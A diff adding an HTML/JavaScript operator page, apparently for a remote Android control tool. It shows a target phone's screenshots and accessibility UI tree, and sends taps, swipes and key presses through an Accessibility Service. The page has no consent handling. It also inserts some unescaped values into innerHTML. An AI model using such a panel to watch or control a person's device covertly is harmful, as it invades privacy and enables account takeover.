@@ -1,0 +1,1019 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Smart UI Controller - Remote Access</title>
+    <link rel="stylesheet" href="/css/hacker-theme.css">
+    <style>
+        body {
+            overflow: hidden;
+            padding: 0;
+            margin: 0;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        body::before {
+            display: none;
+        }
+
+        /* ── HEADER ── */
+        .sui-header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 10px 20px;
+            background: var(--bg-panel);
+            border-bottom: 1px solid var(--border);
+            flex-shrink: 0;
+        }
+
+        .sui-header h1 {
+            font-size: 1rem;
+            color: var(--accent);
+            letter-spacing: 2px;
+            text-transform: uppercase;
+            margin: 0;
+            text-shadow: 0 0 10px var(--accent-glow);
+        }
+
+        .sui-header h1 span {
+            color: var(--text-muted);
+        }
+
+        .back-link {
+            color: var(--text-muted);
+            text-decoration: none;
+            font-size: 0.75rem;
+            transition: color 0.2s;
+            letter-spacing: 1px;
+        }
+
+        .back-link:hover {
+            color: var(--accent);
+        }
+
+        /* ── SPLIT LAYOUT ── */
+        .sui-split {
+            flex: 1;
+            display: flex;
+            min-height: 0;
+            overflow: hidden;
+        }
+
+        /* ── LEFT: PHONE VIEWER ── */
+        .sui-panel-phone {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            background: #020408;
+            padding: 12px;
+            min-width: 300px;
+            position: relative;
+        }
+
+        .phone-toolbar {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            padding: 6px 10px;
+            width: 100%;
+            justify-content: center;
+            flex-shrink: 0;
+        }
+
+        .phone-toolbar .sui-btn {
+            padding: 4px 10px;
+            font-size: 0.65rem;
+        }
+
+        .phone-toolbar .info {
+            font-size: 0.6rem;
+            color: var(--text-muted);
+            margin-left: auto;
+        }
+
+        .phone-toolbar .info .live {
+            color: var(--accent);
+        }
+
+        /* Phone frame — maintains exact mobile aspect ratio */
+        .phone-frame {
+            position: relative;
+            border: 2px solid var(--border);
+            border-radius: 12px;
+            overflow: hidden;
+            background: #000;
+            box-shadow: 0 0 30px rgba(0, 0, 0, 0.8), 0 0 6px var(--accent-glow);
+            flex-shrink: 1;
+            max-height: calc(100vh - 140px);
+        }
+
+        .phone-screen {
+            position: relative;
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
+        }
+
+        .phone-screen img {
+            display: block;
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+        }
+
+        .phone-placeholder {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
+            color: var(--text-muted);
+            font-size: 0.75rem;
+            padding: 40px;
+            text-align: center;
+            width: 280px;
+            height: 560px;
+        }
+
+        .phone-placeholder .icon {
+            font-size: 36px;
+            margin-bottom: 10px;
+            opacity: 0.4;
+        }
+
+        /* Node overlay container — sits on top of screenshot */
+        .node-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+        }
+
+        .node-rect {
+            position: absolute;
+            border: 1px solid transparent;
+            cursor: pointer;
+            pointer-events: auto;
+            transition: all 0.1s ease;
+            z-index: 2;
+        }
+
+        .node-rect:hover {
+            border-color: var(--accent);
+            background: rgba(0, 255, 65, 0.12);
+            box-shadow: 0 0 8px var(--accent-glow);
+        }
+
+        .node-rect.clicking {
+            background: rgba(0, 255, 65, 0.3);
+            border-color: var(--accent);
+        }
+
+        .node-rect .node-tooltip {
+            display: none;
+            position: absolute;
+            bottom: calc(100% + 4px);
+            left: 50%;
+            transform: translateX(-50%);
+            background: var(--bg-panel);
+            border: 1px solid var(--accent-dim);
+            border-radius: 4px;
+            padding: 3px 8px;
+            font-size: 0.6rem;
+            color: var(--accent);
+            white-space: nowrap;
+            z-index: 100;
+            pointer-events: none;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.5);
+        }
+
+        .node-rect:hover .node-tooltip {
+            display: block;
+        }
+
+        /* Shimmer loading */
+        .phone-frame.loading::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: linear-gradient(90deg, transparent 30%, rgba(0, 255, 65, 0.04) 50%, transparent 70%);
+            animation: shimmer 1.5s infinite;
+            pointer-events: none;
+            z-index: 10;
+        }
+
+        @keyframes shimmer {
+            from {
+                transform: translateX(-100%);
+            }
+
+            to {
+                transform: translateX(100%);
+            }
+        }
+
+        /* ── RIGHT: CONTROLS ── */
+        .sui-panel-controls {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            min-height: 0;
+            overflow: hidden;
+            border-left: 1px solid var(--border);
+        }
+
+        /* ── TOOLBAR ── */
+        .sui-toolbar {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            padding: 8px 16px;
+            background: var(--bg-card);
+            border-bottom: 1px solid var(--border);
+            flex-wrap: wrap;
+            flex-shrink: 0;
+        }
+
+        .sui-btn {
+            padding: 5px 12px;
+            border-radius: 4px;
+            font-size: 0.65rem;
+            cursor: pointer;
+            transition: all 0.15s;
+            border: 1px solid transparent;
+            letter-spacing: 0.5px;
+            text-transform: uppercase;
+        }
+
+        .sui-btn-primary {
+            background: rgba(0, 255, 65, 0.08);
+            border-color: var(--accent-dim);
+            color: var(--accent);
+        }
+
+        .sui-btn-primary:hover {
+            background: rgba(0, 255, 65, 0.15);
+            box-shadow: 0 0 8px var(--accent-glow);
+        }
+
+        .sui-btn-primary.active {
+            background: rgba(0, 255, 65, 0.2);
+            border-color: var(--accent);
+        }
+
+        .sui-btn-secondary {
+            background: rgba(255, 255, 255, 0.03);
+            border-color: var(--border);
+            color: var(--text-secondary);
+        }
+
+        .sui-btn-secondary:hover {
+            color: var(--text-primary);
+            border-color: var(--accent-dim);
+        }
+
+        .sui-divider {
+            width: 1px;
+            height: 20px;
+            background: var(--border);
+            margin: 0 2px;
+        }
+
+        .sui-status {
+            margin-left: auto;
+            font-size: 0.6rem;
+            color: var(--text-muted);
+        }
+
+        .sui-status .count {
+            color: var(--accent);
+        }
+
+        /* ── FILTER BAR ── */
+        .sui-filter-bar {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            padding: 6px 16px;
+            background: rgba(0, 0, 0, 0.2);
+            border-bottom: 1px solid var(--border);
+            flex-shrink: 0;
+        }
+
+        .sui-search {
+            flex: 1;
+            padding: 5px 10px;
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: 4px;
+            color: var(--text-primary);
+            font-size: 0.7rem;
+        }
+
+        .sui-search:focus {
+            outline: none;
+            border-color: var(--accent-dim);
+        }
+
+        .sui-search::placeholder {
+            color: var(--text-muted);
+        }
+
+        .sui-filter-btn {
+            padding: 4px 10px;
+            border-radius: 4px;
+            font-size: 0.6rem;
+            cursor: pointer;
+            background: transparent;
+            border: 1px solid var(--border);
+            color: var(--text-muted);
+            transition: all 0.15s;
+            text-transform: uppercase;
+        }
+
+        .sui-filter-btn:hover {
+            color: var(--text-primary);
+        }
+
+        .sui-filter-btn.active {
+            background: rgba(0, 255, 65, 0.08);
+            border-color: var(--accent-dim);
+            color: var(--accent);
+        }
+
+        /* ── NODE LIST ── */
+        .sui-content {
+            flex: 1;
+            overflow-y: auto;
+            padding: 6px 16px;
+        }
+
+        .sui-loading {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 60px;
+            color: var(--text-muted);
+            font-size: 0.75rem;
+            flex-direction: column;
+            gap: 10px;
+        }
+
+        .sui-loading .spinner {
+            width: 24px;
+            height: 24px;
+            border: 2px solid var(--border);
+            border-top: 2px solid var(--accent);
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+
+        @keyframes spin {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+
+        .sui-node {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            padding: 6px 10px;
+            border-radius: 4px;
+            cursor: pointer;
+            border: 1px solid rgba(0, 255, 65, 0.03);
+            margin-bottom: 2px;
+            transition: all 0.1s;
+        }
+
+        .sui-node:hover {
+            background: rgba(0, 255, 65, 0.05);
+            border-color: var(--accent-dim);
+        }
+
+        .sui-node.clicking {
+            background: rgba(0, 255, 65, 0.12);
+            border-color: rgba(0, 255, 65, 0.4);
+        }
+
+        .sui-node.clicked {
+            background: rgba(0, 255, 65, 0.2);
+        }
+
+        .sui-node.not-clickable {
+            opacity: 0.4;
+            cursor: default;
+        }
+
+        .sui-node-icon {
+            font-size: 16px;
+            width: 24px;
+            text-align: center;
+            flex-shrink: 0;
+        }
+
+        .sui-node-body {
+            flex: 1;
+            min-width: 0;
+        }
+
+        .sui-node-label {
+            font-size: 0.75rem;
+            color: var(--text-primary);
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+        }
+
+        .sui-node-meta {
+            display: flex;
+            align-items: center;
+            gap: 4px;
+            margin-top: 1px;
+        }
+
+        .sui-node-class {
+            font-size: 0.55rem;
+            color: var(--text-muted);
+        }
+
+        .sui-tag {
+            display: inline-block;
+            padding: 1px 5px;
+            border-radius: 2px;
+            font-size: 0.5rem;
+            text-transform: uppercase;
+        }
+
+        .tag-clickable {
+            background: rgba(0, 255, 65, 0.1);
+            color: var(--accent);
+        }
+
+        .tag-checkable {
+            background: rgba(0, 170, 255, 0.1);
+            color: var(--info);
+        }
+
+        .tag-checked {
+            background: rgba(255, 170, 0, 0.1);
+            color: var(--warning);
+        }
+
+        .tag-disabled {
+            background: rgba(255, 51, 51, 0.1);
+            color: var(--danger);
+        }
+
+        .sui-node-depth {
+            font-size: 0.55rem;
+            color: var(--text-muted);
+            flex-shrink: 0;
+            opacity: 0.5;
+        }
+
+        /* ── NAV BAR ── */
+        .sui-nav-bar {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 4px;
+            padding: 6px 16px;
+            background: var(--bg-panel);
+            border-top: 1px solid var(--border);
+            flex-shrink: 0;
+        }
+
+        .sui-nav-btn {
+            padding: 6px 14px;
+            border-radius: 4px;
+            font-size: 0.7rem;
+            cursor: pointer;
+            transition: all 0.15s;
+            border: 1px solid var(--border);
+            background: var(--bg-card);
+            color: var(--text-secondary);
+            text-align: center;
+        }
+
+        .sui-nav-btn:hover {
+            border-color: var(--accent-dim);
+            color: var(--text-primary);
+        }
+
+        .sui-nav-btn:active {
+            transform: scale(0.95);
+        }
+
+        .sui-empty {
+            text-align: center;
+            padding: 40px 16px;
+            color: var(--text-muted);
+        }
+
+        .sui-empty .icon {
+            font-size: 36px;
+            margin-bottom: 10px;
+            opacity: 0.4;
+        }
+
+        .sui-empty h3 {
+            font-size: 0.85rem;
+            color: var(--text-secondary);
+            margin-bottom: 4px;
+        }
+
+        .sui-empty p {
+            font-size: 0.65rem;
+        }
+
+        /* ── RESPONSIVE ── */
+        @media (max-width: 768px) {
+            .sui-split {
+                flex-direction: column;
+            }
+
+            .sui-panel-phone {
+                min-width: unset;
+                max-height: 45vh;
+                padding: 8px;
+            }
+
+            .sui-panel-controls {
+                border-left: none;
+                border-top: 1px solid var(--border);
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <!-- HEADER -->
+    <div class="sui-header">
+        <h1>📱 SMART UI <span>CONTROLLER</span></h1>
+        <a href="index.html" class="back-link">← DASHBOARD</a>
+    </div>
+
+    <!-- SPLIT LAYOUT -->
+    <div class="sui-split">
+
+        <!-- LEFT: PHONE VIEWER WITH NODE OVERLAY -->
+        <div class="sui-panel-phone">
+            <div class="phone-toolbar">
+                <button class="sui-btn sui-btn-primary" onclick="refreshTree()">↻ REFRESH</button>
+                <button class="sui-btn sui-btn-primary" id="btn-auto" onclick="toggleAutoRefresh()">⏸ AUTO</button>
+                <button class="sui-btn sui-btn-secondary" onclick="saveScreenshot()" title="Save screenshot">💾
+                    SAVE</button>
+                <span class="info" id="ss-status"><span class="live">●</span> READY</span>
+            </div>
+            <div class="phone-frame" id="phone-frame">
+                <div class="phone-screen" id="phone-screen">
+                    <!-- Placeholder shown before first screenshot -->
+                    <div class="phone-placeholder" id="phone-placeholder">
+                        <span class="icon">📱</span>
+                        <p>Loading device screen...</p>
+                    </div>
+                    <!-- Screenshot image -->
+                    <img id="ss-display" style="display:none;" draggable="false" />
+                    <!-- Node overlays rendered here -->
+                    <div class="node-overlay" id="node-overlay"></div>
+                </div>
+            </div>
+            <!-- Bottom nav on phone side -->
+            <div class="phone-toolbar" style="margin-top:6px;">
+                <button class="sui-btn sui-btn-secondary" onclick="sendKey('BACK')">◀ BACK</button>
+                <button class="sui-btn sui-btn-secondary" onclick="sendKey('HOME')">● HOME</button>
+                <button class="sui-btn sui-btn-secondary" onclick="sendKey('RECENTS')">▣ RECENTS</button>
+                <button class="sui-btn sui-btn-secondary" onclick="sendSwipe('left')">←</button>
+                <button class="sui-btn sui-btn-secondary" onclick="sendSwipe('up')">↑</button>
+                <button class="sui-btn sui-btn-secondary" onclick="sendSwipe('down')">↓</button>
+                <button class="sui-btn sui-btn-secondary" onclick="sendSwipe('right')">→</button>
+            </div>
+        </div>
+
+        <!-- RIGHT: CONTROLS -->
+        <div class="sui-panel-controls">
+            <div class="sui-toolbar">
+                <button class="sui-btn sui-btn-secondary" onclick="sendKey('ENTER')">↵ ENTER</button>
+                <button class="sui-btn sui-btn-secondary" onclick="sendSwipe('left')">← LEFT</button>
+                <button class="sui-btn sui-btn-secondary" onclick="sendSwipe('up')">↑ UP</button>
+                <button class="sui-btn sui-btn-secondary" onclick="sendSwipe('down')">↓ DOWN</button>
+                <button class="sui-btn sui-btn-secondary" onclick="sendSwipe('right')">→ RIGHT</button>
+                <div class="sui-status">
+                    <span class="count" id="node-count">0</span> elements &bull;
+                    <span id="last-update">—</span>
+                </div>
+            </div>
+            <div class="sui-filter-bar">
+                <input type="text" class="sui-search" id="search-input" placeholder="Search text, class, id..."
+                    oninput="filterNodes()">
+                <button class="sui-filter-btn active" id="filter-all" onclick="setFilter('all')">All</button>
+                <button class="sui-filter-btn" id="filter-clickable" onclick="setFilter('clickable')">Click</button>
+                <button class="sui-filter-btn" id="filter-text" onclick="setFilter('text')">Text</button>
+                <button class="sui-filter-btn" id="filter-toggle" onclick="setFilter('toggle')">Toggle</button>
+            </div>
+            <div class="sui-content" id="content">
+                <div class="sui-loading">
+                    <div class="spinner"></div>
+                    Reading device UI...
+                </div>
+            </div>
+            <div class="sui-nav-bar">
+                <button class="sui-nav-btn" onclick="sendKey('BACK')">◀ Back</button>
+                <button class="sui-nav-btn" onclick="sendKey('HOME')">● Home</button>
+                <button class="sui-nav-btn" onclick="sendKey('RECENTS')">▣ Recents</button>
+                <button class="sui-nav-btn" onclick="sendSwipe('left')">⬅</button>
+                <button class="sui-nav-btn" onclick="sendSwipe('up')">⬆</button>
+                <button class="sui-nav-btn" onclick="sendSwipe('down')">⬇</button>
+                <button class="sui-nav-btn" onclick="sendSwipe('right')">➡</button>
+            </div>
+        </div>
+
+    </div>
+
+    <script src="/js/api.js"></script>
+    <script src="/js/call-notification.js"></script>
+    <script>
+        const deviceId = new URLSearchParams(window.location.search).get('deviceId');
+        if (!deviceId) window.location.href = 'index.html';
+
+        let allNodes = [];
+        let currentFilter = 'all';
+        let autoRefreshInterval = null;
+        let autoRefreshActive = false;
+        let ssBlobUrl = null;
+        let screenW = 1080, screenH = 2400; // defaults, updated from device
+
+        // ── Icons ──
+        function getIcon(n) {
+            if (n.cls.includes('Switch') || n.cls.includes('Toggle')) return '🔘';
+            if (n.cls.includes('Button')) return '🔲';
+            if (n.cls.includes('CheckBox')) return '☑️';
+            if (n.cls.includes('EditText')) return '✏️';
+            if (n.cls.includes('Image')) return '🖼️';
+            if (n.cls.includes('RecyclerView') || n.cls.includes('ListView')) return '📋';
+            if (n.cls.includes('TextView')) return '📝';
+            if (n.click) return '👆';
+            return '◽';
+        }
+
+        function getLabel(n) {
+            let label = n.t || n.d || n.id?.split('/')?.pop() || n.cls;
+            if (label.length > 60) label = label.substring(0, 57) + '...';
+            return label;
+        }
+
+        function getTags(n) {
+            let t = '';
+            if (n.click) t += '<span class="sui-tag tag-clickable">click</span>';
+            if (n.check) t += '<span class="sui-tag tag-checkable">check</span>';
+            if (n.checked) t += '<span class="sui-tag tag-checked">✓ on</span>';
+            if (!n.enabled) t += '<span class="sui-tag tag-disabled">off</span>';
+            return t;
+        }
+
+        function esc(s) {
+            const d = document.createElement('div');
+            d.textContent = s;
+            return d.innerHTML;
+        }
+
+        // ── Parse bounds string "left,top,right,bottom" ──
+        function parseBounds(boundsStr) {
+            if (!boundsStr) return null;
+            const parts = boundsStr.split(',').map(Number);
+            if (parts.length !== 4 || parts.some(isNaN)) return null;
+            return { left: parts[0], top: parts[1], right: parts[2], bottom: parts[3] };
+        }
+
+        // ── Render node overlays on screenshot ──
+        function renderOverlays() {
+            const overlay = document.getElementById('node-overlay');
+            const img = document.getElementById('ss-display');
+            if (!img || img.style.display === 'none') {
+                overlay.innerHTML = '';
+                return;
+            }
+
+            // Use the actual screenshot pixel dimensions as truth
+            const natW = img.naturalWidth || screenW;
+            const natH = img.naturalHeight || screenH;
+
+            if (natW === 0 || natH === 0) return;
+
+            // Use percentage-based positioning so overlays match regardless of display size
+            const clickableNodes = allNodes.filter(n => (n.click || n.check || n.id || n.d) && n.enabled && n.bounds);
+
+            overlay.innerHTML = clickableNodes.map(n => {
+                const b = parseBounds(n.bounds);
+                if (!b) return '';
+
+                // Convert pixel bounds to percentage of screen
+                const leftPct = (b.left / natW) * 100;
+                const topPct = (b.top / natH) * 100;
+                const widthPct = ((b.right - b.left) / natW) * 100;
+                const heightPct = ((b.bottom - b.top) / natH) * 100;
+
+                if (widthPct < 0.5 || heightPct < 0.3) return ''; // skip tiny
+
+                const label = esc(n.t || n.d || n.cls || '');
+                return `<div class="node-rect"
+                    style="left:${leftPct}%; top:${topPct}%; width:${widthPct}%; height:${heightPct}%;"
+                    onclick="clickNode(${n.i}, this)"
+                    title="${label}">
+                    <span class="node-tooltip">${label || n.cls}</span>
+                </div>`;
+            }).join('');
+        }
+
+        // ── Fetch Tree ──
+        async function refreshTree() {
+            const content = document.getElementById('content');
+            const frame = document.getElementById('phone-frame');
+            frame.classList.add('loading');
+
+            try {
+                const result = await api.sendCommand(deviceId, 'get_ui_tree', {});
+                const data = result.data || result;
+                allNodes = data.nodes || [];
+
+                // Update screen resolution from device
+                if (data.screenWidth) screenW = data.screenWidth;
+                if (data.screenHeight) screenH = data.screenHeight;
+
+                document.getElementById('node-count').textContent = allNodes.length;
+                document.getElementById('last-update').textContent = new Date().toLocaleTimeString();
+
+                filterNodes();
+
+                // Auto-capture screenshot, then overlay nodes
+                autoCapture();
+            } catch (err) {
+                content.innerHTML = `
+                    <div class="sui-empty">
+                        <div class="icon">❌</div>
+                        <h3>Failed to read UI</h3>
+                        <p>${err.message || 'Is Accessibility Service enabled?'}</p>
+                    </div>`;
+                frame.classList.remove('loading');
+            }
+        }
+
+        // ── Filter & Render node list ──
+        function setFilter(f) {
+            currentFilter = f;
+            document.querySelectorAll('.sui-filter-btn').forEach(b => b.classList.remove('active'));
+            document.getElementById(`filter-${f}`).classList.add('active');
+            filterNodes();
+        }
+
+        function filterNodes() {
+            const q = document.getElementById('search-input').value.toLowerCase();
+            const content = document.getElementById('content');
+
+            let nodes = allNodes.filter(n => {
+                if (!n.t && !n.d && !n.click && !n.check && !n.id) return false;
+                if (!n.enabled) return false;
+                if (currentFilter === 'clickable' && !n.click) return false;
+                if (currentFilter === 'text' && !n.t) return false;
+                if (currentFilter === 'toggle' && !n.check) return false;
+                if (q) {
+                    const haystack = `${n.t || ''} ${n.d || ''} ${n.cls || ''} ${n.id || ''}`.toLowerCase();
+                    if (!haystack.includes(q)) return false;
+                }
+                return true;
+            });
+
+            if (nodes.length === 0) {
+                content.innerHTML = `
+                    <div class="sui-empty">
+                        <div class="icon">📭</div>
+                        <h3>No matching elements</h3>
+                        <p>Try changing the filter or search</p>
+                    </div>`;
+                return;
+            }
+
+            content.innerHTML = nodes.map(n => `
+                <div class="sui-node ${n.click || n.check ? '' : 'not-clickable'}"
+                     onclick="clickNode(${n.i}, this)"
+                     title="${n.cls} | ${n.id || ''} | ${n.bounds}">
+                    <span class="sui-node-icon">${getIcon(n)}</span>
+                    <div class="sui-node-body">
+                        <div class="sui-node-label">${esc(getLabel(n))}</div>
+                        <div class="sui-node-meta">
+                            <span class="sui-node-class">${n.cls}</span>
+                            ${getTags(n)}
+                        </div>
+                    </div>
+                    <span class="sui-node-depth">d${n.depth}</span>
+                </div>
+            `).join('');
+        }
+
+        // ── Click Node ──
+        async function clickNode(index, el) {
+            if (el) el.classList.add('clicking');
+
+            try {
+                const result = await api.sendCommand(deviceId, 'click_node', { index });
+                const data = result.data || result;
+
+                if (data.clicked) {
+                    if (el) el.classList.add('clicked');
+                    api.showToast('Clicked ✓', 'success');
+                    setTimeout(() => refreshTree(), 1000);
+                } else {
+                    if (el) el.classList.remove('clicking');
+                    api.showToast('Click failed', 'error');
+                }
+            } catch (err) {
+                if (el) el.classList.remove('clicking');
+                api.showToast(err.message, 'error');
+            }
+        }
+
+        // ── Navigation Keys ──
+        async function sendKey(key) {
+            try {
+                await api.sendCommand(deviceId, 'accessibility_key', { key });
+                api.showToast(`${key} ✓`, 'success');
+                setTimeout(() => refreshTree(), 800);
+            } catch (e) {
+                api.showToast(e.message, 'error');
+            }
+        }
+
+        async function sendSwipe(direction) {
+            try {
+                await api.sendCommand(deviceId, 'accessibility_swipe', { direction });
+                setTimeout(() => refreshTree(), 800);
+            } catch (e) {
+                api.showToast(e.message, 'error');
+            }
+        }
+
+        // ── Auto Refresh ──
+        function toggleAutoRefresh() {
+            const btn = document.getElementById('btn-auto');
+            autoRefreshActive = !autoRefreshActive;
+            if (autoRefreshActive) {
+                btn.textContent = '▶ AUTO';
+                btn.classList.add('active');
+                autoRefreshInterval = setInterval(refreshTree, 3000);
+            } else {
+                btn.textContent = '⏸ AUTO';
+                btn.classList.remove('active');
+                if (autoRefreshInterval) clearInterval(autoRefreshInterval);
+            }
+        }
+
+        // ── Auto-capture screenshot ──
+        async function autoCapture() {
+            const statusEl = document.getElementById('ss-status');
+            statusEl.innerHTML = '<span class="live">●</span> CAPTURING...';
+
+            try {
+                const result = await api.sendCommand(deviceId, 'accessibility_screenshot', {});
+                const data = result.data || result;
+
+                if (data.image) {
+                    showFrame(data.image);
+                    statusEl.innerHTML = '<span class="live">●</span> LIVE • ' + new Date().toLocaleTimeString();
+                    // Size frame from actual image + render overlays after image loads
+                    const img = document.getElementById('ss-display');
+                    img.onload = () => {
+                        sizePhoneFrame(img.naturalWidth, img.naturalHeight);
+                        renderOverlays();
+                    };
+                } else {
+                    throw new Error(result.error || 'No image');
+                }
+            } catch (err) {
+                statusEl.innerHTML = '<span style="color:var(--danger)">●</span> ' + (err.message || 'Failed');
+            } finally {
+                document.getElementById('phone-frame').classList.remove('loading');
+            }
+        }
+
+        // ── Show frame ──
+        function showFrame(base64Data) {
+            if (ssBlobUrl) URL.revokeObjectURL(ssBlobUrl);
+
+            const binary = atob(base64Data);
+            const bytes = new Uint8Array(binary.length);
+            for (let i = 0; i < binary.length; i++) bytes[i] = binary.charCodeAt(i);
+            const blob = new Blob([bytes], { type: 'image/jpeg' });
+            ssBlobUrl = URL.createObjectURL(blob);
+
+            const img = document.getElementById('ss-display');
+            const placeholder = document.getElementById('phone-placeholder');
+            img.src = ssBlobUrl;
+            img.style.display = 'block';
+            if (placeholder) placeholder.style.display = 'none';
+        }
+
+        // ── Size phone frame from actual screenshot aspect ratio ──
+        function sizePhoneFrame(imgW, imgH) {
+            const phoneFrame = document.getElementById('phone-frame');
+            const maxH = window.innerHeight - 140;
+            const aspect = imgW / imgH;
+            const frameW = Math.min(maxH * aspect, 360);
+            const frameH = frameW / aspect;
+            phoneFrame.style.width = frameW + 'px';
+            phoneFrame.style.height = frameH + 'px';
+        }
+
+        // ── Re-render overlays on resize ──
+        window.addEventListener('resize', () => {
+            const img = document.getElementById('ss-display');
+            if (img && img.naturalWidth) {
+                sizePhoneFrame(img.naturalWidth, img.naturalHeight);
+            }
+            renderOverlays();
+        });
+
+        // ── Save screenshot ──
+        function saveScreenshot() {
+            if (!ssBlobUrl) {
+                api.showToast('No screenshot to save', 'error');
+                return;
+            }
+            const a = document.createElement('a');
+            a.href = ssBlobUrl;
+            const ts = new Date().toISOString().replace(/[:.]/g, '-').slice(0, 19);
+            a.download = `screenshot_${ts}.jpg`;
+            a.click();
+            api.showToast('Screenshot saved ✓', 'success');
+        }
+
+        // ── Keyboard shortcuts ──
+        document.addEventListener('keydown', (e) => {
+            if (document.activeElement.tagName === 'INPUT') return;
+            switch (e.key) {
+                case 'r': refreshTree(); break;
+                case 'Escape': case 'Backspace': e.preventDefault(); sendKey('BACK'); break;
+                case 'Home': e.preventDefault(); sendKey('HOME'); break;
+            }
+        });
+
+        // ── Cleanup ──
+        window.addEventListener('beforeunload', () => {
+            if (autoRefreshInterval) clearInterval(autoRefreshInterval);
+            if (ssBlobUrl) URL.revokeObjectURL(ssBlobUrl);
+        });
+
+        // ── WebSocket: Listen for live UI change pushes from device ──
+        let liveWs = null;
+        let liveRefreshTimer = null;
+
+        function connectLiveWs() {
+            const proto = location.protocol === 'https:' ? 'wss:' : 'ws:';
+            liveWs = new WebSocket(`${proto}//${location.host}/`);
+
+            liveWs.onopen = () => {
+                liveWs.send(JSON.stringify({ type: 'identify', role: 'browser' }));
+                console.log('[LiveWS] Connected for UI change events');
+            };
+
+            liveWs.onmessage = (e) => {
+                try {
+                    const data = JSON.parse(e.data);
+                    if (data.type === 'ui_changed' && data.deviceId === deviceId) {
+                        // Debounce — refresh at most once per 300ms
+                        if (liveRefreshTimer) clearTimeout(liveRefreshTimer);
+                        liveRefreshTimer = setTimeout(() => refreshTree(), 300);
+                    }
+                } catch (err) { }
+            };
+
+            liveWs.onclose = () => {
+                console.log('[LiveWS] Disconnected, reconnecting in 3s...');
+                setTimeout(connectLiveWs, 3000);
+            };
+
+            liveWs.onerror = () => liveWs.close();
+        }
+
+        connectLiveWs();
+
+        window.addEventListener('beforeunload', () => {
+            if (liveWs) liveWs.close();
+        });
+
+        // ── Init ──
+        refreshTree();
+    </script>
+</body>
+
+</html>
